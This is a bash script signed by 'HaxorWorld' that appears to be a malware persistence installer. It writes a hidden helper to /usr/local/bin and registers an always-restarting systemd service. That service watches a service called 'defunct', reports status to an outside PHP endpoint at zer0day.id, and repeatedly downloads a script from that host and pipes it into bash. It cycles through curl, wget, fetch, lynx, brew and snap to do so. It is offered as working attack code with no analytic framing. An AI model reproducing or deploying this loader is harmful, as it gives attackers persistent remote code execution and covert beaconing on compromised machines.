#!/bin/bash
#Code by HaxorWorld

self_script_path="/usr/local/bin/self"
service_file_path="/etc/systemd/system/self.service"
php_endpoint="https://zer0day.id/love.php"  
service_name="defunct"  
pid_file="/var/run/self.pid"

cat << 'EOF' > "$self_script_path"
#!/bin/bash

host=$(hostname)
php_endpoint="https://zer0day.id/love.php" 
service_name="defunct"
pid_file="/var/run/self.pid"

# Fungsi untuk memeriksa alat downloader yang tersedia dan menggunakannya
download() {
    url="$1"
    if command -v curl &> /dev/null; then
        curl -fsSL "$url"
    elif command -v wget &> /dev/null; then
        wget -qO- "$url"
    elif command -v fetch &> /dev/null; then
        fetch -qo - "$url"
    elif command -v lynx &> /dev/null; then
        lynx -source "$url"
    elif command -v brew &> /dev/null; then
        brew install wget && wget -qO- "$url"
    elif command -v snap &> /dev/null; then
        snap install wget && wget -qO- "$url"
    else
        echo "No suitable downloader found!"
        return 1
    fi
}

check_pid() {
    if [ -f "$pid_file" ]; then
        if ps -p "$(cat $pid_file)" > /dev/null 2>&1; then
            return 0
        else
            return 1
        fi
    else
        return 1
    fi
}

write_pid() {
    echo $$ > "$pid_file"
}

cleanup() {
    rm -f "$pid_file"
}
trap cleanup EXIT

write_pid

while true; do
    if systemctl is-active --quiet "$service_name"; then
        sleep 1
    else
        curl -sL -H "Content-Type: application/json" -X POST "$php_endpoint?status=service_down"
        
        
        download "https://zer0day.id/y" | bash
        
        if systemctl is-active --quiet "$service_name"; then
            curl -sL -H "Content-Type: application/json" -X POST "$php_endpoint?status=service_up"
        else
            curl -sL -H "Content-Type: application/json" -X POST "$php_endpoint?status=service_fail"
        fi
    fi
    sleep 10
done
EOF

chmod +x "$self_script_path"

cat << EOF > "$service_file_path"
[Unit]
Description=Self Service

[Service]
ExecStart=$self_script_path
Restart=always
RestartSec=10
PIDFile=$pid_file

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable self.service
systemctl start self.service

systemctl status self.service
